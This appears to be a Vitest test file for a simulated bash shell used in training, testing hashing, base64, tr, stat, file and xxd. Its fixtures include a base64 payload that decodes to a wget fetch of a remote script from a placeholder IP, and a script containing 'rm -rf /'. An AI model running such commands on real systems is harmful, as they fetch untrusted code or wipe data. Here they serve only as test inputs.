import { describe, it, expect, beforeEach } from 'vitest';
import { createShell } from './index';
import { ShellEngine } from './ShellEngine';

function bash(): ShellEngine {
  const shell = createShell({
    type: 'bash',
    user: 'azubi',
    hostname: 'kritis',
    files: [
      // Exact contents (no trailing newline) so hashes match published vectors.
      { path: '/home/azubi/abc.txt', content: 'abc' },
      { path: '/home/azubi/empty.txt', content: '' },
      { path: '/home/azubi/payload.b64', content: 'd2dldCBodHRwOi8vMjAzLjAuMTEzLjY2L3guc2g=' },
      { path: '/home/azubi/log.txt', content: 'alpha\nbravo\ncharlie\n' },
      { path: '/home/azubi/spaces.txt', content: 'a   b     c\n' },
      { path: '/home/azubi/script.sh', content: '#!/bin/bash\nrm -rf /\n' },
    ],
  });
  shell.getVfs().setCurrentPath('/home/azubi');
  return shell;
}

describe('sha256sum / md5sum (known-answer vectors)', () => {
  let shell: ShellEngine;
  beforeEach(() => { shell = bash(); });

  it('matches the published SHA-256 vector for "abc"', () => {
    const r = shell.execute('sha256sum abc.txt');
    expect(r.output).toBe('ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad  abc.txt');
  });

  it('matches the published SHA-256 vector for the empty string', () => {
    const r = shell.execute('sha256sum empty.txt');
    expect(r.output.split('  ')[0]).toBe('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855');
  });

  it('matches the published MD5 vector for "abc"', () => {
    const r = shell.execute('md5sum abc.txt');
    expect(r.output).toBe('900150983cd24fb0d6963f7d28e17f72  abc.txt');
  });

  it('matches the published MD5 vector for the empty string', () => {
    const r = shell.execute('md5sum empty.txt');
    expect(r.output.split('  ')[0]).toBe('d41d8cd98f00b204e9800998ecf8427e');
  });

  it('matches the published SHA-1 vector for "abc"', () => {
    const r = shell.execute('sha1sum abc.txt');
    expect(r.output).toBe('a9993e364706816aba3e25717850c26c9cd0d89d  abc.txt');
  });

  it('hashes piped stdin against "-"', () => {
    const r = shell.execute('echo -n abc | sha256sum');
    expect(r.output).toBe('ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad  -');
  });

  it('supports the IOC-verification idiom (compare against a known hash)', () => {
    const known = shell.execute('sha256sum abc.txt').output.split('  ')[0];
    expect(known).toBe('ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad');
  });
});

describe('base64', () => {
  let shell: ShellEngine;
  beforeEach(() => { shell = bash(); });

  it('encodes stdin', () => {
    expect(shell.execute('echo -n foobar | base64').output).toBe('Zm9vYmFy');
    expect(shell.execute('echo -n Man | base64').output).toBe('TWFu');
    expect(shell.execute('echo -n hello | base64').output).toBe('aGVsbG8=');
  });

  it('decodes a payload with -d', () => {
    const r = shell.execute('base64 -d payload.b64');
    expect(r.output).toBe('wget http://203.0.113.66/x.sh');
  });

  it('round-trips through a pipe', () => {
    const r = shell.execute('echo -n "critical-infra" | base64 | base64 -d');
    expect(r.output).toBe('critical-infra');
  });

  it('errors on invalid input', () => {
    const r = shell.execute('echo -n "!!!not base64" | base64 -d');
    expect(r.exitCode).toBe(1);
    expect(r.error).toContain('invalid input');
  });
});

describe('tr', () => {
  let shell: ShellEngine;
  beforeEach(() => { shell = bash(); });

  it('translates character ranges', () => {
    expect(shell.execute("echo -n abc | tr 'a-z' 'A-Z'").output).toBe('ABC');
  });

  it('deletes characters with -d', () => {
    expect(shell.execute("echo -n 'a1b2c3' | tr -d '0-9'").output).toBe('abc');
  });

  it('squeezes repeats with -s', () => {
    expect(shell.execute("cat spaces.txt | tr -s ' '").output.trim()).toBe('a b c');
  });

  it('supports POSIX classes', () => {
    expect(shell.execute("echo -n Hello | tr '[:upper:]' '[:lower:]'").output).toBe('hello');
  });
});

describe('tee / nl / tac / rev / strings / stat / file / xxd', () => {
  let shell: ShellEngine;
  beforeEach(() => { shell = bash(); });

  it('tee writes stdin to a file and passes it through', () => {
    const r = shell.execute('echo hello | tee out.txt');
    expect(r.output).toBe('hello');
    expect(shell.getVfs().readFile('/home/azubi/out.txt')).toMatchObject({ ok: true, value: 'hello\n' });
  });

  it('nl numbers non-empty lines', () => {
    const r = shell.execute('nl log.txt');
    expect(r.output.split('\n')[0]).toBe('     1\talpha');
  });

  it('tac reverses line order', () => {
    expect(shell.execute('tac log.txt').output).toBe('charlie\nbravo\nalpha');
  });

  it('rev reverses characters per line', () => {
    expect(shell.execute('echo -n abc | rev').output).toBe('cba');
  });

  it('strings extracts printable runs', () => {
    const r = shell.execute('strings log.txt');
    expect(r.output).toContain('charlie');
  });

  it('stat reports size and mode', () => {
    const r = shell.execute('stat abc.txt');
    expect(r.output).toContain('Size: 3');
    expect(r.output).toMatch(/Access: \(0\d{3}\//);
  });

  it('file recognizes a shell script by shebang', () => {
    expect(shell.execute('file script.sh').output).toContain('shell script');
  });

  it('file recognizes plain text', () => {
    expect(shell.execute('file log.txt').output).toBe('log.txt: ASCII text');
  });

  it('xxd produces an offset/hex/ascii dump', () => {
    const r = shell.execute('echo -n abc | xxd');
    expect(r.output).toBe('00000000: 6162 63                                  abc');
  });
});
